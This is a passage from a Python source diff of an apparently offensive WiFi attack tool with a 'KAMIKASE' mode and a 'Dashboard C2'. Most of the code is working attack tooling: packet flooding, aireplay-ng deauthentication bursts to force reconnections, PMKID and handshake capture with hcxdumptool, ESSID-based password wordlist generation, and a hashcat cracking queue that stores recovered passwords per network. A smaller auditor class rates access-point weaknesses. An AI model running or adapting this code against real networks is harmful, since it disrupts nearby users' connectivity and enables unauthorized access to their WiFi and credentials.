+                       count=64, inter=0.005, verbose=False)
+                with self.contador_lock:
+                    self.contador_global += 64
+                    self.contador_por_bssid[bssid] += 64
+            except Exception:
+                time.sleep(0.05)
+
+    # ─── UI LIVE ─────────────────────────────────────────────
+
+    async def _loop_ui_live(self):
+        # Atualização simples a cada 1s (sem rich.Live para evitar conflitos)
+        ultimo_total = 0
+        ultimo_t = time.time()
+        while not self.stop_event.is_set():
+            await asyncio.sleep(1.0)
+            agora = time.time()
+            with self.contador_lock:
+                total = self.contador_global
+            delta = total - ultimo_total
+            dt = max(agora - ultimo_t, 0.001)
+            pps = int(delta / dt)
+            ultimo_total = total
+            ultimo_t = agora
+            elapsed = int(agora - self.start_time)
+            mins, secs = divmod(elapsed, 60)
+            ativos = sum(1 for t in self.threads if t.is_alive())
+            print(f"\r  ⚡ KAMIKASE [{mins:02d}:{secs:02d}] "
+                  f"Pacotes: {total:,} | PPS: {pps:,} | BSSIDs ativos: {ativos}/{len(self.alvos)}",
+                  end="", flush=True)
+
+    # ─── ENCERRAMENTO ────────────────────────────────────────
+
+    def _encerrar_limpo(self):
+        print()  # quebra linha do print live
+        self.ui.section("KAMIKASE — encerrando")
+        self.stop_event.set()
+        # Mata subprocess
+        for p in self.subprocs:
+            try:
+                p.terminate()
+                try:
+                    p.wait(timeout=3)
+                except Exception:
+                    p.kill()
+            except Exception:
+                pass
+        # Aguarda threads scapy
+        for t in self.threads:
+            t.join(timeout=2)
+        # Restaura monitor → managed
+        self._restaurar_iface()
+        # Audit log final
+        self._audit_log_fim()
+        # Sumário
+        duracao = time.time() - self.start_time if self.start_time else 0
+        with self.contador_lock:
+            total = self.contador_global
+        self.ui.success(f"Total: {total:,} pacotes | Duração: {duracao:.1f}s | "
+                        f"BSSIDs: {len(self.alvos)}")
+        self.ui.info(f"Audit log: {self.audit_path}")
+
+    def _restaurar_iface(self):
+        if self.ctx.motor == "adm":
+            return  # nada a fazer
+        if self.ctx.motor == "root-kali" and HAS_AIRMON and self.iface_monitor:
+            try:
+                subprocess.run(["airmon-ng", "stop", self.iface_monitor],
+                               timeout=10, check=False,
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except Exception:
+                pass
+        elif HAS_IW and self.iface_orig:
+            try:
+                cmds = [
+                    ["ip", "link", "set", self.iface_orig, "down"],
+                    ["iw", "dev", self.iface_orig, "set", "type", "managed"],
+                    ["ip", "link", "set", self.iface_orig, "up"],
+                ]
+                for c in cmds:
+                    if self.ctx.motor == "root-termux":
+                        c = ["su", "-c", " ".join(c)]
+                    subprocess.run(c, timeout=5, check=False,
+                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except Exception:
+                pass
+
+    # ─── AUDIT LOG ───────────────────────────────────────────
+
+    def _audit_log_inicio(self):
+        try:
+            base = self.det.output_dir or Path(".")
+            base.mkdir(parents=True, exist_ok=True)
+            self.audit_path = base / "kamikase_audit.log"
+        except Exception:
+            self.audit_path = Path("kamikase_audit.log")
+        try:
+            with self.audit_path.open("a", encoding="utf-8") as f:
+                f.write(f"\n=== KAMIKASE INICIO {datetime.now().isoformat()} ===\n")
+                f.write(f"Plataforma: {self.ctx.plataforma} | Motor: {self.ctx.motor}\n")
+                f.write(f"Interface: {self.iface_orig} | Monitor: {self.iface_monitor}\n")
+                f.write(f"BSSIDs alvos ({len(self.alvos)}):\n")
+                for a in self.alvos:
+                    f.write(f"  - {a.get('bssid', '?')} | {a.get('essid', '?')} "
+                            f"| canal {a.get('canal', '?')} | RSSI {a.get('rssi', '?')}\n")
+                f.write(f"Comando: {' '.join(sys.argv)}\n")
+        except Exception:
+            pass
+
+    def _audit_log_fim(self):
+        try:
+            duracao = time.time() - self.start_time if self.start_time else 0
+            with self.contador_lock:
+                total = self.contador_global
+            with self.audit_path.open("a", encoding="utf-8") as f:
+                f.write(f"=== KAMIKASE FIM {datetime.now().isoformat()} ===\n")
+                f.write(f"Duração: {duracao:.2f}s | Total: {total} pacotes\n")
+                f.write(f"Motivo: {self.encerramento_motivo or 'normal'}\n")
+                for bssid, cnt in self.contador_por_bssid.items():
+                    f.write(f"  - {bssid}: {cnt} pacotes\n")
+        except Exception:
+            pass
+
+
+# ══════════════════ EVENT BUS — DASHBOARD --live ══════════════
+# Singleton acoplado ao SocketIO. Quando o dashboard está ativo,
+# qualquer módulo emite eventos via bus.emit() e o painel atualiza ao vivo.
+
+class EventBus:
+    """Hub de eventos — desacopla módulos do canal de transporte."""
+
+    def __init__(self):
+        self.socketio: Optional[Any] = None
+        self.queued: List[Tuple[str, Dict]] = []  # cache pré-conexão
+        self.lock = threading.Lock()
+
+    def attach(self, sio: Any):
+        self.socketio = sio
+        # drena fila (caso eventos tenham sido emitidos antes de conectar)
+        with self.lock:
+            for nome, dados in self.queued:
+                try:
+                    sio.emit(nome, dados)
+                except Exception:
+                    pass
+            self.queued.clear()
+
+    def emit(self, nome: str, dados: Dict):
+        if self.socketio:
+            try:
+                self.socketio.emit(nome, dados)
+            except Exception:
+                pass
+        else:
+            with self.lock:
+                if len(self.queued) < 500:
+                    self.queued.append((nome, dados))
+
+
+# Bus global — None se --live não passou
+event_bus: Optional[EventBus] = None
+
+
+def emitir(evento: str, **dados):
+    """Helper conveniência: emite evento se bus existe, no-op senão.
+    `evento` é o nome do canal SocketIO; `**dados` vão como payload (podem
+    incluir uma chave 'nome' sem colidir com o parâmetro)."""
+    if event_bus is not None:
+        event_bus.emit(evento, dados)
+
+
+# ══════════════════ AUDITOR DE SEGURANÇA WIFI ═════════════════
+# Usado pelo --kamikase --live para classificar APs por risco.
+
+class WifiSecurityAuditor:
+    """Audita um AP a partir do dump do `iw scan` ou `airodump-ng csv`.
+    Detecta WPS habilitado, criptografia legacy (WEP/TKIP), beacon interval
+    anômalo, e vazamento de potência (sinal forte = AP fora do perímetro)."""
+
+    @staticmethod
+    def auditar(ap: Dict[str, Any]) -> Dict[str, Any]:
+        achados: List[Dict[str, Any]] = []
+        score = 100
+
+        crypto = (ap.get("crypto") or "").upper()
+        if "WEP" in crypto:
+            achados.append({"tipo": "crypto_weak", "severidade": "critica",
+                            "descricao": "WEP legado — quebrado em minutos"})
+            score -= 60
+        elif "TKIP" in crypto and "CCMP" not in crypto:
+            achados.append({"tipo": "crypto_weak", "severidade": "alta",
+                            "descricao": "TKIP sem CCMP — vulnerável a ataques de chave"})
+            score -= 35
+        elif crypto in ("OPN", "OPEN", ""):
+            achados.append({"tipo": "open_network", "severidade": "alta",
+                            "descricao": "Rede aberta sem criptografia"})
+            score -= 50
+
+        if ap.get("wps_enabled"):
+            achados.append({"tipo": "wps_enabled", "severidade": "alta",
+                            "descricao": "WPS ativo — vulnerável a Pixie Dust / Reaver"})
+            score -= 30
+
+        beacon = ap.get("beacon_interval", 100)
+        if beacon and (beacon < 50 or beacon > 500):
+            achados.append({"tipo": "beacon_anomalo", "severidade": "info",
+                            "descricao": f"Beacon interval {beacon}ms incomum (esperado ~100ms)"})
+            score -= 5
+
+        rssi = ap.get("rssi")
+        try:
+            rssi_v = float(rssi) if rssi not in (None, "?") else -100
+            if rssi_v > -30:
+                achados.append({"tipo": "sinal_excessivo", "severidade": "media",
+                                "descricao": f"RSSI {rssi_v}dBm — vazando para fora do perímetro"})
+                score -= 15
+        except Exception:
+            pass
+
+        # Mapa fácil pra UI: cor + label
+        sev_max = max((a["severidade"] for a in achados),
+                      key=lambda s: ["info", "media", "alta", "critica"].index(s),
+                      default="info")
+        return {
+            "score": max(0, min(100, score)),
+            "achados": achados,
+            "severidade_maior": sev_max if achados else "ok",
+        }
+
+
+# ══════════════════ CAPTURA PMKID/HANDSHAKE ════════════════════
+# Tenta hcxdumptool para PMKID; fallback: deauth + airodump captura handshake.
+
+class PMKIDCapture:
+    """Captura PMKID via hcxdumptool ou handshake via airodump+aireplay."""
+
+    def __init__(self, ui: "TerminalUI", iface: str, timeout_s: int = 25):
+        self.ui = ui
+        self.iface = iface
+        self.timeout_s = timeout_s
+        HANDSHAKE_DIR.mkdir(parents=True, exist_ok=True)
+
+    def capturar(self, bssid: str, canal: int = 0) -> Optional[Path]:
+        """Tenta PMKID primeiro (rápido, não precisa cliente associado).
+        Fallback para deauth+handshake se hcx falhar. Retorna pcapng path."""
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        nome = bssid.replace(":", "")
+        out = HANDSHAKE_DIR / f"hs_{nome}_{ts}.pcapng"
+
+        if HAS_HCXDUMPTOOL:
+            self.ui.info(f"  PMKID: hcxdumptool em {bssid} (até {self.timeout_s}s)")
+            try:
+                cmd = ["hcxdumptool", "-i", self.iface,
+                       "-w", str(out),
+                       "--filterlist_ap", "-",
+                       "--filtermode=2"]
+                # Modo simples: 25s focado
+                proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
+                                         stderr=subprocess.DEVNULL,
+                                         stdin=subprocess.PIPE)
+                try:
+                    proc.stdin.write(f"{bssid}\n".encode())
+                    proc.stdin.close()
+                except Exception:
+                    pass
+                try:
+                    proc.wait(timeout=self.timeout_s)
+                except subprocess.TimeoutExpired:
+                    proc.terminate()
+                    try: proc.wait(timeout=3)
+                    except Exception: proc.kill()
+                if out.exists() and out.stat().st_size > 100:
+                    return out
+            except Exception as e:
+                self.ui.warn(f"  hcxdumptool falhou: {e}")
+
+        # Fallback: airodump-ng captura + aireplay-ng deauth (clássico)
+        if HAS_AIRODUMP and HAS_AIREPLAY:
+            self.ui.info(f"  Fallback: airodump+aireplay deauth para forçar handshake")
+            try:
+                base = str(out.with_suffix(""))
+                cmd_dump = ["airodump-ng", "--bssid", bssid,
+                            "--channel", str(canal or 1),
+                            "-w", base, "--output-format", "pcapng",
+                            self.iface]
+                p_dump = subprocess.Popen(cmd_dump, stdout=subprocess.DEVNULL,
+                                           stderr=subprocess.DEVNULL)
+                # Deauth burst para forçar reconexão e capturar handshake
+                time.sleep(2)
+                cmd_deauth = ["aireplay-ng", "-0", "10", "-a", bssid, self.iface]
+                subprocess.run(cmd_deauth, stdout=subprocess.DEVNULL,
+                               stderr=subprocess.DEVNULL, timeout=15)
+                # Aguarda mais tempo pro handshake
+                time.sleep(self.timeout_s - 17 if self.timeout_s > 17 else 8)
+                p_dump.terminate()
+                try: p_dump.wait(timeout=3)
+                except Exception: p_dump.kill()
+                # airodump cria <base>-01.pcapng
+                achados = list(HANDSHAKE_DIR.glob(f"{out.stem.split('_')[0]}*.pcapng"))
+                achados.sort(key=lambda p: p.stat().st_mtime, reverse=True)
+                if achados and achados[0].stat().st_size > 1000:
+                    return achados[0]
+            except Exception as e:
+                self.ui.warn(f"  Fallback handshake falhou: {e}")
+        return None
+
+
+# ══════════════════ MEMÓRIA PERSISTENTE ═══════════════════════
+# Tudo local em ./memoria/. Mantém estado entre sessões: APs vistos,
+# handshakes capturados, senhas quebradas, histórico de zonas.
+# Apaga só se o usuário quiser (botão no dashboard ou rm manual).
+
+class MemoriaPersistente:
+    """JSON-based local storage. Single file db.json + pasta handshakes/."""
+
+    DIR_BASE = Path("memoria")
+    DIR_HANDSHAKES = DIR_BASE / "handshakes"
+    PATH_DB = DIR_BASE / "db.json"
+
+    def __init__(self):
+        self.DIR_BASE.mkdir(parents=True, exist_ok=True)
+        self.DIR_HANDSHAKES.mkdir(parents=True, exist_ok=True)
+        self.lock = threading.Lock()
+        self.dados: Dict[str, Any] = {
+            "version": VERSION,
+            "criado_em": datetime.now().isoformat(),
+            "atualizado_em": None,
+            "aps": {},  # bssid → registro completo
+        }
+        self._carregar()
+
+    def _carregar(self):
+        if not self.PATH_DB.exists():
+            return
+        try:
+            with self.PATH_DB.open("r", encoding="utf-8") as f:
+                self.dados = json.load(f)
+            # Migração leve: garante campos
+            if "aps" not in self.dados:
+                self.dados["aps"] = {}
+        except Exception:
+            pass
+
+    def salvar(self):
+        with self.lock:
+            self.dados["atualizado_em"] = datetime.now().isoformat()
+            try:
+                tmp = self.PATH_DB.with_suffix(".tmp")
+                with tmp.open("w", encoding="utf-8") as f:
+                    json.dump(self.dados, f, indent=2, ensure_ascii=False)
+                tmp.replace(self.PATH_DB)
+            except Exception:
+                pass
+
+    def registrar_ap(self, ap: Dict) -> Dict:
+        """Mescla AP detectado com registro existente. Preserva
+        primeiro_visto, senha, handshake_path, histórico."""
+        bssid = ap.get("bssid")
+        if not bssid:
+            return ap
+        with self.lock:
+            existente = self.dados["aps"].get(bssid, {})
+            agora = datetime.now().isoformat()
+            primeiro = existente.get("primeiro_visto", agora)
+            visitas = existente.get("visitas", 0) + 1
+            mesclado = {
+                **existente,
+                **ap,  # dados frescos sobrescrevem (RSSI, canal podem mudar)
+                "primeiro_visto": primeiro,
+                "ultima_vez": agora,
+                "visitas": visitas,
+            }
+            # Preserva campos sensíveis se já existem
+            for campo in ("senha", "quebrada_em", "wordlist_usada",
+                           "handshake_path", "handshake_em",
+                           "historico_zonas"):
+                if campo in existente and campo not in ap:
+                    mesclado[campo] = existente[campo]
+            self.dados["aps"][bssid] = mesclado
+        self.salvar()
+        return mesclado
+
+    def atualizar_ap(self, bssid: str, **kwargs):
+        with self.lock:
+            if bssid in self.dados["aps"]:
+                self.dados["aps"][bssid].update(kwargs)
+        self.salvar()
+
+    def registrar_zona(self, bssid: str, zona: str):
+        """Adiciona ao histórico de movimentações entre zonas."""
+        with self.lock:
+            ap = self.dados["aps"].get(bssid)
+            if not ap:
+                return
+            hist = ap.setdefault("historico_zonas", [])
+            hist.append({"zona": zona, "em": datetime.now().isoformat()})
+            ap["zona_atual"] = zona
+        self.salvar()
+
+    def registrar_senha(self, bssid: str, senha: str, wordlist: str = ""):
+        with self.lock:
+            ap = self.dados["aps"].get(bssid)
+            if ap:
+                ap["senha"] = senha
+                ap["quebrada_em"] = datetime.now().isoformat()
+                ap["wordlist_usada"] = wordlist
+        self.salvar()
+
+    def registrar_handshake(self, bssid: str, essid: str,
+                              path_origem: Path) -> Path:
+        """Copia handshake para ./memoria/handshakes/ com nome legível."""
+        if not path_origem.exists():
+            return path_origem
+        safe_essid = re.sub(r'[^A-Za-z0-9_-]', '_', (essid or "unknown"))[:32]
+        safe_bssid = bssid.replace(":", "")
+        nome = f"{safe_essid}_{safe_bssid}.pcapng"
+        destino = self.DIR_HANDSHAKES / nome
+        try:
+            shutil.copy2(path_origem, destino)
+        except Exception:
+            return path_origem
+        with self.lock:
+            ap = self.dados["aps"].get(bssid)
+            if ap:
+                ap["handshake_path"] = str(destino)
+                ap["handshake_em"] = datetime.now().isoformat()
+        self.salvar()
+        return destino
+
+    def obter_ap(self, bssid: str) -> Optional[Dict]:
+        return self.dados["aps"].get(bssid)
+
+    def listar_aps(self) -> List[Dict]:
+        return list(self.dados["aps"].values())
+
+    def remover_ap(self, bssid: str):
+        with self.lock:
+            self.dados["aps"].pop(bssid, None)
+        self.salvar()
+
+    def limpar(self, apagar_handshakes: bool = False):
+        with self.lock:
+            self.dados["aps"] = {}
+        if apagar_handshakes:
+            try:
+                for f in self.DIR_HANDSHAKES.glob("*.pcapng"):
+                    f.unlink()
+            except Exception:
+                pass
+        self.salvar()
+
+    def stats(self) -> Dict:
+        with self.lock:
+            aps = list(self.dados["aps"].values())
+            handshakes_em_disco = list(self.DIR_HANDSHAKES.glob("*.pcapng"))
+            return {
+                "total_aps": len(aps),
+                "com_handshake": sum(1 for a in aps if a.get("handshake_path")),
+                "quebradas": sum(1 for a in aps if a.get("senha")),
+                "handshakes_em_disco": len(handshakes_em_disco),
+                "tamanho_total_kb": round(sum(f.stat().st_size for f in handshakes_em_disco) / 1024, 1),
+                "handshakes_dir": str(self.DIR_HANDSHAKES.resolve()),
+                "atualizado_em": self.dados.get("atualizado_em"),
+            }
+
+
+# ══════════════════ WORDLIST CONTEXTUAL ═══════════════════════
+# Personalização militar: para cada ESSID alvo, gera 500-1000 variações
+# CONTEXTUAIS (nome + sufixos numéricos + anos + leet speak + caps +
+# símbolos comuns) e PREPENDA na wordlist base. Atalho: senhas
+# contextualmente prováveis vão ser testadas PRIMEIRO, antes da rockyou.
+
+class WordlistContextual:
+    """Gera variações inteligentes a partir do nome do WiFi."""
+
+    SUFIXOS_NUM = ["", "0", "00", "000", "01", "02", "03", "07", "08", "09",
+                    "10", "11", "12", "13", "21", "22", "23", "24", "25",
+                    "69", "77", "88", "99", "111", "123", "321", "420", "666",
+                    "777", "786", "999", "1111", "1234", "2222", "3333", "4321",
+                    "5555", "12345", "54321", "12321", "11111", "00000",
+                    "123456", "654321", "111111", "1234567", "12345678",
+                    "123456789", "1234567890"]
+
+    ANOS = [str(a) for a in range(2010, 2027)]
+
+    SUFIXOS_SIMBOLO = ["!", "@", "#", "$", "*", ".", "_", "-",
+                        "@1", "@123", "!123", "#1", "*1",
+                        "@2024", "@2025", "!2024", "!2025",
+                        "_123", "-123", ".123",
+                        "!@#", "!@#$", "@#$", "$%^",
+                        "1!", "1@", "12@", "12!"]
+
+    PREFIXOS = ["", "wifi", "WiFi", "WIFI", "rede", "Rede",
+                 "casa", "Casa", "internet", "Internet", "@"]
+
+    @staticmethod
+    def _leet(s: str) -> str:
+        tab = str.maketrans({"a":"4","A":"4","e":"3","E":"3","i":"1","I":"1",
+                              "o":"0","O":"0","s":"5","S":"5","t":"7","T":"7"})
+        return s.translate(tab)
+
+    @classmethod
+    def gerar_variacoes(cls, essid: str, max_variacoes: int = 1000) -> List[str]:
+        """Gera lista de senhas-candidatas baseadas no ESSID.
+        Filtra para WPA2-PSK (8-63 caracteres) e ordena por probabilidade."""
+        if not essid or essid in ("<oculto>", "?"):
+            return []
+
+        # Limpa ESSID (remove caracteres não-imprimíveis)
+        nome_limpo = re.sub(r'[^A-Za-z0-9_\-\.]', '', essid)
+        if not nome_limpo:
+            return []
+
+        nl = nome_limpo.lower()
+        nu = nome_limpo.upper()
+        nc = nome_limpo.capitalize()
+        leet_nl = cls._leet(nl)
+        leet_nu = cls._leet(nu)
+
+        # Bases para combinar
+        bases: Set[str] = {essid, nome_limpo, nl, nu, nc, leet_nl, leet_nu}
+
+        # Adiciona partes do nome (split em camelCase ou separadores)
+        partes = re.findall(r'[A-Z]?[a-z]+|[A-Z]+(?=[A-Z]|$)|\d+', nome_limpo)
+        if len(partes) > 1:
+            for p in partes:
+                if len(p) >= 3:
+                    bases.add(p.lower())
+                    bases.add(p.upper())
+                    bases.add(p.capitalize())
+
+        variacoes: Set[str] = set()
+        bases_lista = list(bases)
+
+        # Combina cada base com sufixos numéricos, anos e símbolos
+        for b in bases_lista:
+            variacoes.add(b)
+            for s in cls.SUFIXOS_NUM:
+                variacoes.add(b + s)
+                if s and len(s) >= 2:
+                    variacoes.add(s + b)
+            for ano in cls.ANOS:
+                variacoes.add(b + ano)
+                variacoes.add(ano + b)
+                variacoes.add(b + "@" + ano)
+                variacoes.add(b + "_" + ano)
+            for sim in cls.SUFIXOS_SIMBOLO:
+                variacoes.add(b + sim)
+
+        # Prefixos genéricos comuns
+        for b in bases_lista[:4]:
+            for p in cls.PREFIXOS:
+                if p:
+                    variacoes.add(p + b)
+                    variacoes.add(b + p)
+
+        # Reverso e duplicado
+        variacoes.add(nl[::-1])
+        variacoes.add(nu[::-1])
+        variacoes.add(nl + nl)
+        variacoes.add(nl + nu)
+
+        # Filtra: WPA2-PSK exige 8-63 chars
+        validas = [v for v in variacoes if 8 <= len(v) <= 63]
+
+        # Ordena: tamanho 8-12 primeiro (mais comum em redes residenciais),
+        # depois alfabético para determinismo
+        validas.sort(key=lambda x: (
+            0 if 8 <= len(x) <= 12 else (1 if 13 <= len(x) <= 16 else 2),
+            len(x), x.lower()
+        ))
+
+        return validas[:max_variacoes]
+
+    @classmethod
+    def gerar_arquivo(cls, essid: str, base_wordlist: Optional[Path] = None) -> Path:
+        """Cria ./WordList/_contextual_<essid>.txt com variações + base."""
+        WORDLIST_DIR.mkdir(parents=True, exist_ok=True)
+        nome_safe = re.sub(r'[^A-Za-z0-9_\-]', '_', essid)[:32] or "unknown"
+        out = WORDLIST_DIR / f"_contextual_{nome_safe}.txt"
+        variacoes = cls.gerar_variacoes(essid)
+        with out.open("w", encoding="utf-8", errors="ignore") as f:
+            f.write(f"# NetDroid contextual wordlist para ESSID: {essid}\n")
+            f.write(f"# Gerado em: {datetime.now().isoformat()}\n")
+            f.write(f"# Variações contextuais: {len(variacoes)}\n")
+            for v in variacoes:
+                f.write(v + "\n")
+            if base_wordlist and base_wordlist.exists():
+                f.write(f"# --- WORDLIST BASE ABAIXO ({base_wordlist.name}) ---\n")
+                try:
+                    with base_wordlist.open("r", encoding="utf-8", errors="ignore") as base:
+                        for linha in base:
+                            f.write(linha)
+                except Exception:
+                    pass
+        return out
+
+
+# ══════════════════ HASHCAT WORKER ═════════════════════════════
+# Fila assíncrona de crack — múltiplos APs entram, processa serial,
+# emite progresso via bus a cada N segundos.
+
+class HashcatWorker:
+    """Thread única consumindo fila de pcapng → hashcat → resultado."""
+
+    def __init__(self, ui: "TerminalUI", memoria: Optional["MemoriaPersistente"] = None):
+        self.ui = ui
+        self.memoria = memoria
+        self.fila: List[Dict[str, Any]] = []  # cada item: {bssid, essid, pcapng, perfil, status}
+        self.lock = threading.Lock()
+        self.stop_event = threading.Event()
+        self.thread: Optional[threading.Thread] = None
+        self.atual: Optional[Dict[str, Any]] = None
+        self.resultados: List[Dict[str, Any]] = []
+
+    def start(self):
+        if self.thread and self.thread.is_alive():
+            return
+        self.thread = threading.Thread(target=self._loop, daemon=True, name="hashcat-worker")
+        self.thread.start()
+
+    def stop(self):
+        self.stop_event.set()
+
+    def enfileirar(self, bssid: str, essid: str, pcapng: Path, perfil: str = "low",
+                    wordlist: Optional[Path] = None, contextual: bool = True):
+        with self.lock:
+            self.fila.append({
+                "bssid": bssid, "essid": essid,
+                "pcapng": str(pcapng),
+                "perfil": perfil,
+                "wordlist": str(wordlist) if wordlist else "",
+                "contextual": contextual,
+                "status": "queued",
+                "progresso": 0,
+                "eta": "?",
+                "started_at": None,
+                "finished_at": None,
+                "senha": None,
+            })
+        emitir("hashcat_queue_update", queue=self._snapshot_fila())
+
+    def _snapshot_fila(self) -> List[Dict[str, Any]]:
+        with self.lock:
+            snap = [dict(it) for it in self.fila]
+        if self.atual:
+            snap.insert(0, dict(self.atual))
+        return snap
+
+    def _loop(self):
+        while not self.stop_event.is_set():
+            with self.lock:
+                if not self.fila:
+                    self.atual = None
+                    time.sleep(0.5)
+                    continue
+                self.atual = self.fila.pop(0)
+            self._processar(self.atual)
+
+    def _processar(self, item: Dict[str, Any]):
+        item["status"] = "preparing"
+        item["started_at"] = datetime.now().isoformat()
+        emitir("hashcat_start", item=item)
+
+        if not HAS_HASHCAT:
+            item["status"] = "error"
+            item["erro"] = "hashcat não instalado"
+            emitir("hashcat_done", item=item)
+            self.resultados.append(item)
+            return
+
+        # 1) Converte pcapng → hash 22000 (PMKID + EAPOL)
+        hash_path = Path(item["pcapng"]).with_suffix(".22000")
+        try:
+            if HAS_HCXPCAPNGTOOL:
+                cmd_conv = [shutil.which("hcxpcapngtool") or "hcxpcaptool",
+                            "-o", str(hash_path), item["pcapng"]]
+                subprocess.run(cmd_conv, timeout=30,
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            if not hash_path.exists() or hash_path.stat().st_size == 0:
+                item["status"] = "error"
+                item["erro"] = "pcapng sem hash extraível (sem PMKID/EAPOL)"
+                emitir("hashcat_done", item=item)
+                self.resultados.append(item)
+                return
+        except Exception as e:
+            item["status"] = "error"
+            item["erro"] = f"hcxpcapngtool falhou: {e}"
+            emitir("hashcat_done", item=item)
+            self.resultados.append(item)
+            return
+
+        # 2) Wordlist — gera versão contextual prepend (500+ variações por ESSID)
+        wordlist_base = item.get("wordlist") or self._wordlist_default()
+        usar_contextual = item.get("contextual", True)  # default ON
+        essid = item.get("essid", "") or ""
+
+        if usar_contextual and essid and essid not in ("<oculto>", "?"):
+            self.ui.info(f"  📚 Gerando wordlist contextual para '{essid}'...")
+            wl_combinada = WordlistContextual.gerar_arquivo(
+                essid, Path(wordlist_base) if wordlist_base else None)
+            wordlist = str(wl_combinada)
+            n_ctx = len(WordlistContextual.gerar_variacoes(essid))
+            item["contextual_count"] = n_ctx
+            item["wordlist_efetiva"] = wl_combinada.name
+            self.ui.success(f"  ✓ {n_ctx} variações contextuais prepended antes da base")
+        else:
+            wordlist = wordlist_base
+
+        if not wordlist or not Path(wordlist).exists():
+            item["status"] = "error"
+            item["erro"] = "Wordlist não encontrada (esperado em ./WordList/)"
+            emitir("hashcat_done", item=item)
+            self.resultados.append(item)
+            return
+
+        # 3) Roda hashcat com perfil
+        perfil = HASHCAT_PROFILES.get(item.get("perfil", "low"), HASHCAT_PROFILES["low"])
+        cmd = ["hashcat", "-m", "22000",
+               "-w", str(perfil["workload"]),
+               "--status", "--status-timer=2",
+               "--potfile-disable",
+               "-o", str(hash_path) + ".cracked",
+               str(hash_path), wordlist]
+        item["status"] = "running"
+        emitir("hashcat_progress", item=item)
+
+        try:
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                     stderr=subprocess.STDOUT, text=True,
+                                     bufsize=1, errors="ignore")
+            for linha in proc.stdout:
+                if self.stop_event.is_set():
+                    proc.terminate()
+                    break
+                # Parse "Progress.........: X/Y (Z%)"
+                m = re.search(r"Progress\.+:\s*\d+/\d+\s*\(([\d.]+)%\)", linha)
+                if m:
+                    try:
+                        item["progresso"] = float(m.group(1))
+                    except ValueError:
+                        pass
+                m = re.search(r"Time\.Estimated\.+:\s*(.+?)\(", linha)
+                if m:
+                    item["eta"] = m.group(1).strip()
+                if "Status" in linha and "Cracked" in linha:
+                    item["status"] = "cracked"
+                emitir("hashcat_progress", item=item)
+            proc.wait(timeout=10)
+        except Exception as e:
+            item["erro"] = str(e)
+
+        # 4) Checa se quebrou
+        cracked_path = Path(str(hash_path) + ".cracked")
+        if cracked_path.exists() and cracked_path.stat().st_size > 0:
+            try:
+                with cracked_path.open("r", errors="ignore") as f:
+                    linhas = [l.strip() for l in f if l.strip()]
+                if linhas:
+                    # Formato: <hash>:<senha> ou só <senha>
+                    senha = linhas[0].split(":")[-1]
+                    item["senha"] = senha
+                    item["status"] = "cracked"
+            except Exception:
+                pass
+        if item["status"] != "cracked":
+            item["status"] = "exhausted"
+
+        item["finished_at"] = datetime.now().isoformat()
+        item["progresso"] = 100.0 if item["status"] == "cracked" else item.get("progresso", 0)
+        # Persiste senha na memória (sobrevive entre sessões)
+        if self.memoria and item["status"] == "cracked" and item.get("senha"):
+            self.memoria.registrar_senha(
+                item["bssid"], item["senha"],
+                wordlist=item.get("wordlist_efetiva", "") or item.get("wordlist", ""))
+        emitir("hashcat_done", item=item)
+        self.resultados.append(item)
+
+    def _wordlist_default(self) -> Optional[str]:
+        if not WORDLIST_DIR.exists():
+            return None
+        candidatos = sorted(WORDLIST_DIR.glob("*.txt"))
+        return str(candidatos[0]) if candidatos else None
+
+
+# ══════════════════ DASHBOARD C2 LIVE ══════════════════════════
+# Flask + SocketIO; HTML embutido; abre browser automaticamente.
+
+class LiveDashboard:
+    """Servidor Flask + SocketIO rodando em thread separada.
+    Renderiza um dos templates (god ou kamikase) conforme o modo ativo."""
+
+    def __init__(self, ui: "TerminalUI", modo: str):
+        self.ui = ui
+        self.modo = modo  # "god" ou "kamikase"
+        self.app: Optional[Any] = None
+        self.sio: Optional[Any] = None
+        self.thread: Optional[threading.Thread] = None
+        self.kami_engine: Optional[Any] = None  # injetado pelo KamikaseEngine
+        self.hashcat: Optional[HashcatWorker] = None
+        self.estado: Dict[str, Any] = {
+            "modo": modo,
+            "iniciado": datetime.now().isoformat(),
+            "hosts": [],          # --god
+            "vulns": [],          # --god
+            "aps": [],            # --kamikase
+            "zonas": {            # --kamikase
+                "verde": [], "vermelha": [], "azul": [],
+            },
+            "fase": "",           # --god (FASE 1/3, etc.)
+            "pacotes_total": 0,   # --kamikase
+        }
+
+    # ─── inicialização ──────────────────────────────────────
+
+    def disponivel(self) -> bool:
+        return HAS_FLASK
+
+    def iniciar(self):
+        if not HAS_FLASK:
+            self.ui.error("Flask/SocketIO não instalados. pip install flask flask-socketio")
+            return False
+        global event_bus
+        event_bus = EventBus()
+        self.app = Flask(__name__)
+        self.app.config["SECRET_KEY"] = DASHBOARD_SECRET
+        self.sio = SocketIO(self.app, cors_allowed_origins="*",
+                             async_mode="threading", logger=False, engineio_logger=False)
+        event_bus.attach(self.sio)
+        self._registrar_rotas()
+        self.thread = threading.Thread(
+            target=self._run_server, daemon=True, name="dashboard")
+        self.thread.start()
+        time.sleep(0.5)  # espera o servidor subir
+        url = f"http://{DASHBOARD_HOST}:{DASHBOARD_PORT}"
+        self.ui.success(f"Dashboard C2 ao vivo: {url}")
+        try:
+            import webbrowser
+            webbrowser.open(url)
+        except Exception:
+            pass
+        return True
+
+    def _run_server(self):
+        try:
+            self.sio.run(self.app, host=DASHBOARD_HOST, port=DASHBOARD_PORT,
+                         debug=False, use_reloader=False, allow_unsafe_werkzeug=True)
+        except TypeError:
+            self.sio.run(self.app, host=DASHBOARD_HOST, port=DASHBOARD_PORT,
+                         debug=False, use_reloader=False)
+        except Exception as e:
+            self.ui.error(f"Servidor dashboard falhou: {e}")
+
+    # ─── rotas e handlers ───────────────────────────────────
+
+    def _registrar_rotas(self):
+        app = self.app
+        sio = self.sio
+        dash = self
+
+        @app.route("/")
+        def index():
+            html = TEMPLATE_GOD if self.modo == "god" else TEMPLATE_KAMIKASE
+            return html
+
+        @app.route("/api/estado")
+        def api_estado():
+            return jsonify(dash.estado)
+
+        @app.route("/api/wordlists")
+        def api_wordlists():
+            if not WORDLIST_DIR.exists():
+                return jsonify([])
+            return jsonify([p.name for p in WORDLIST_DIR.glob("*.txt")])
+
